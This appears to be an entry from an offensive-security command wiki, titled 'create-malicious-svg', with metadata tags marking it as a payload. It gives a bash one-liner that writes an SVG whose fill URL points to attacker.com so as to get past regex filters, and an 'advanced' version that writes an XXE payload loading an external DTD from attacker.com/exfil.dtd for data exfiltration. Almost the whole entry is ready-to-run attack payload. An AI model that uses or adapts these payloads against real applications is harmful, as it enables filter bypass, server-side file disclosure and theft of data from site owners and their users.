---
data: echo '<rect fill="url(//attacker.com/malicious.svg#exploit)">' > malicious.svg
tags:
  - svg
  - payload
type: command
executor: bash
platforms:
  - Linux
  - Windows
id: c7b60b04-78c7-4de0-b255-d19ad5d5d4a9
created_at: '2025-12-13T09:00:28.096Z'
updated_at: '2025-12-13T09:00:28.096Z'
verified: false
validated: true
submitted: true
---
# create-malicious-svg

## Command

```bash
echo '<rect fill="url(//attacker.com/malicious.svg#exploit)">' > malicious.svg
```

## Description

Creates a malicious SVG file that bypasses regex filters by using double slashes to load external content.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `content` | SVG payload string | Yes |
| `filename` | Output file name | Yes |

## Examples

### Basic Usage

```bash
echo '<rect fill="url(//attacker.com/malicious.svg#exploit)">' > malicious.svg
```

### Advanced Usage

```bash
echo '<!DOCTYPE svg [ <!ENTITY % outside SYSTEM "http://attacker.com/exfil.dtd"> %outside; ]>' > advanced.svg
```

## Expected Output

A file named malicious.svg containing the SVG payload.

## Related

- [[commands/upload-svg-payload]]
- [[procedures/Bypass-Regex-Filter-to-Load-External-SVG]]
